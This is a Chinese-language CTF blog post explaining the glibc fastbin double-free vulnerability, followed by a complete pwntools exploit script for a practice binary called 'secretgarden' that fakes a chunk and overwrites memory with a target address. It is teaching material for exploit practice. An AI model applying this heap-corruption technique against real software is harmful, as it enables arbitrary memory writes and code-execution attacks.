---
title: Double Free
date: 2018-07-23 08:37:40
tags: [CTF, PWN]
categories: pwn练习
---
#double free 漏洞 介绍

double free漏洞就是明面上的意思，即可以对一个chunk free两次，由于在free的时候，glibc只对main_arena指向的堆块进行检查，即只有当main_arena直接指向的chunk和将要free的hchunk是同一个chunk时程序才会报"double free"错误，也就是说我们只要间隔free就能绕过这个检测。
如下：
<!--more-->
int main(void)
{
    void *chunk1,*chunk2,*chunk3;
    chunk1=malloc(0x10);
    chunk2=malloc(0x10);

    free(chunk1);
    free(chunk2);
    free(chunk1);
    return 0;
}
第一次释放free chunk1时，fastbin中链表结构arena->chunk1->NULL
第二次释放free chunk2时，fastbin中链表结构arena->chunk2->chunk1->NULL
此时若free的是chunk2则glibc就能检测到double free从而报错
第三次释放free chunk1时，fastbin中链表结构arena->chunk1->chunk2->chunk1->chunk2

此时若能够在chunk被malloc后修改其fd指向则fastbin中的chunk1也指向修改的地址，如果这个地址时攻击者精心构造过的，那么就能造成一个任意地址写的漏洞。
chunk1被malloc后我们再malloc2次指定大小的size后，再下一次就可以在任意地址构造chunk，改写任意地址内容了。

此题就是一个double free的白板题，可以帮助了解double free. 
exp 如下：

```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

r = process('./secretgarden')

def raiseflower(length,name,color):
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(length))
    r.recvuntil(":")
    r.sendline(name)
    r.recvuntil(":")
    r.sendline(color)

def visit():
    r.recvuntil(":")
    r.sendline("2")

def remove(idx):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))

def clean():
    r.recvuntil(":")
    r.sendline("4")

magic = 0x400c7b
fake_chunk = 0x601ffa
raiseflower(0x50,"da","red")
raiseflower(0x50,"da","red")
remove(0)
remove(1)
remove(0)
raiseflower(0x50,p64(fake_chunk),"blue")
raiseflower(0x50,"da","red")
raiseflower(0x50,"da","red")
raiseflower(0x50,"a"*6 + p64(0) + p64(magic)*2 ,"red")

r.interactive()

```

